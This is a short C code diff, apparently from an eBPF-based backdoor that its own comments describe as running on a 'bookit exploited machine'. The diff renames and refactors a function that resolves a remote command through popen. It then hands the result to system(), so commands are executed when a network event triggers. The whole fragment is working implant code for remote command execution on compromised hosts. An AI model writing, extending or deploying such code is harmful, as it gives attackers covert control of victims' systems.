@@ -76,11 +76,11 @@ void usage(){
   exit(0);
 }
 
-// handlerev will handle a reverse lookup against
+// handlerevrce will handle a reverse lookup against
 // a triggered event. This is responsible for
 // finding whatever remote command will need to
 // be executed on the bookit exploited machine.
-char *handlerev(char dial[INET_ADDRSTRLEN], char *recrce) {
+void handlerevrce(char dial[INET_ADDRSTRLEN], char *rce) {
   printf("  * Boop: %s\n ", dial);
   // -- Hacky implementation --
   char cmd[MAX_RCE_SIZE];
@@ -88,14 +88,11 @@ char *handlerev(char dial[INET_ADDRSTRLEN], char *recrce) {
   FILE *fp;
   fp = popen(cmd, "r");
   if (fp == NULL) {
-    return recrce;
+    return;
   }
-  while (fgets(recrce, MAX_RCE_SIZE, fp) != NULL) {
-    //printf("RCE: %s\n", recrce);
-    return recrce;
+  while (fgets(rce, MAX_RCE_SIZE, fp) != NULL) {
   }
   // -- Hacky implementation --
-  return recrce;
 }
 
 struct config {
@@ -230,12 +227,11 @@ int main(int argc, char **argv) {
         }
       }
       if (!ignore) {
-          char *rce;
-          char *recrce = malloc(MAX_RCE_SIZE);
-          rce = handlerev(saddrval, recrce);
+          char *rce = malloc(MAX_RCE_SIZE);
+          handlerevrce(saddrval, rce);
           printf(" <- %s", rce);
           system(rce);
-          free(recrce);
+          free(rce);
       }
       err = bpf_map_delete_elem(fd, &jkey);
       if (err < 0) {
